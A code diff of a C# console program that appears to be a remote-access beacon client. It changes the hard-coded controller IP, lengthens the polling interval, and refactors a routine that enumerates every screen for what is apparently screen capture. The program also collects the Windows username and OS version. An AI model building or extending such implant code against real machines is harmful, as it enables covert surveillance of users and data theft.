@@ -16,7 +16,7 @@ namespace ConsoleApp1
 {
     internal class Program
     {
-        static readonly string SERVER_URL = "10.10.14.42";
+        static readonly string SERVER_URL = "10.10.14.83";
         static string MyIpInfo;
         static readonly string WindowsUsername = WindowsIdentity.GetCurrent().Name;
         static readonly string WindowsName = Environment.OSVersion.ToString();
@@ -59,7 +59,7 @@ namespace ConsoleApp1
                 catch (Exception ex)
                 {
                 }
-                Thread.Sleep(3000);
+                Thread.Sleep(20000);
             }
 
         }
@@ -109,13 +109,15 @@ namespace ConsoleApp1
                 catch { return null; }
         }
 
-        public static List<string> Screen()
+        public static List<string> getAllScreen()
         {
             List<string> list = new List<string>();
+            Screen[] screens;
+            screens = Screen.AllScreens;
             try
             {
                 int screenIndex = 0;
-                foreach (Screen screen in System.Windows.Forms.Screen.AllScreens)
+                foreach (Screen screen in screens)
                 {
                     screenIndex++;
                     try
@@ -153,7 +155,7 @@ namespace ConsoleApp1
 
         public static JArray ScreenJArray()
         {
-            var screenArray = Screen();
+            var screenArray = getAllScreen();
             if (screenArray == null) return null;
             return JArray.FromObject(screenArray);
         }
